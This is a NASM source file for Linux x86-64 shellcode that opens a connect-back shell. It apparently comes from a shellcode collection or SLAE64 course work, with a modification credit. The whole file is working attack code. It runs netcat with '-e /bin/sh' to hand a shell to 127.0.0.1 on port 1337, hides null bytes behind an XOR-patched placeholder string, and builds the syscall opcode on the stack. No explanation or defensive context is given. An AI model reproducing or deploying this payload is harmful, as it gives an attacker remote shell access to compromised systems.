; { Title: Shellcode linux/x86-64 connect back shell }

; Author    : Gaussillusion
; Len       : 109 bytes
; Language  : Nasm

;syscall: execve("/bin/nc",{"/bin/nc","ip","1337","-e","/bin/sh"},NULL)
;Modified by Christophe G SLAE64-1337
;New size 100


global _start:


_start:
   jmp short findaddress


_realstart:
   xor rdx , rdx          ; rdx set to null , execve("/bin/nc" ,  {"/bin/nc","127.0.0.1","1337","-e","/bin/sh"} , 0)
   pop rdi
   xor byte [rdi + 0x7] , 0x41
   xor byte [rdi + 0x11] , 0x41
   xor byte [rdi + 0x16] , 0x41   ; replace A with null
   xor byte [rdi + 0x19] , 0x41
   xor byte [rdi + 0x21] , 0x41

; setup addresses


   lea rdi , [rdi]                    ; "/bin/nc"
   lea r10 , [rdi + 0x8]              ; "127.0.0.1"
   lea r8 , [rdi + 0x12]              ; "1337"
   lea rbx , [rdi + 0x17]             ; "-e"
   lea r9 , [rdi + 0x1a]              ; "/bin/sh"

   push rdx                           ; null push
   push r9
   push rbx
   push r8
   push r10
   push rdi
   mov rsi , rsp
   add al , 59
   xor r14 , r14
   mov r14w ,  0x050f   ; opcode for syscall in reverse order
   push r14
   push rsp
   pop r14
   call r14    ;  syscall


   findaddress:
      call _realstart
      string : db "/bin/ncA127.0.0.1A1337A-eA/bin/shA" ; {"/bin/nc","127.0.0.1","1337","-e","/bin/sh"}
